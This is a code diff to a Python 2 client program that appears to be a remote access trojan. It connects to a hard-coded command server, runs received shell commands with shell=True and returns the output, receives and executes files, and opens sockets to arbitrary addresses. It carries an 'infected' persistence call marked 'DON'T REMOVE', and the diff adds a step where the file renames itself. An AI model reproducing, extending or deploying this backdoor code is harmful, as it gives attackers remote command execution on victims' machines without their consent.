@@ -56,7 +56,8 @@ class Handle():
         self.file_index = -1
 
     def exec_file(self):
-        os.system("python " + self.file_name)
+        # os.system("python " + self.file_name)
+        subprocess.Popen(["python", self.file_name], stdout=subprocess.PIPE, shell=True)
         # self.terminate()
 
     def append_to_file(self, fileTransfer):
@@ -115,7 +116,8 @@ class Handle():
         d.clientRsp.id = id
         d.clientRsp.cmdCommandResult.result = ""
         try:
-            output = subprocess.Popen([cmdCommand.cmd.split()], stdout=subprocess.PIPE, shell=True)
+            print cmdCommand.cmd
+            output = subprocess.Popen(cmdCommand.cmd.split(), stdout=subprocess.PIPE, shell=True)
             result = output.stdout.read()
             d.clientRsp.cmdCommandResult.result = result
             d.clientRsp.status = data_pb2.RESULT_OK
@@ -125,12 +127,13 @@ class Handle():
         my_socket.send(d.SerializeToString())
 
     def openSession(self, openSession):
-        print "openSession"
+        print "open Session"
         try:
             soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             soc.connect((openSession.ip, openSession.port))
             self.sessions.append(ServerSession(soc, threaded_function))
         except Exception as ex:
+            print "close session on error"
             print ex.message
 
 
@@ -159,6 +162,10 @@ def main():
     """
     try:
         # persistent('infected', os.path.abspath(__file__))  # DON'T REMOVE
+
+        # rename me to client.py
+        os.rename(__file__, os.getcwd() + "/client.py")
+
         global my_socket
         my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         my_socket.connect((SERVER_ADDRESS, PORT))
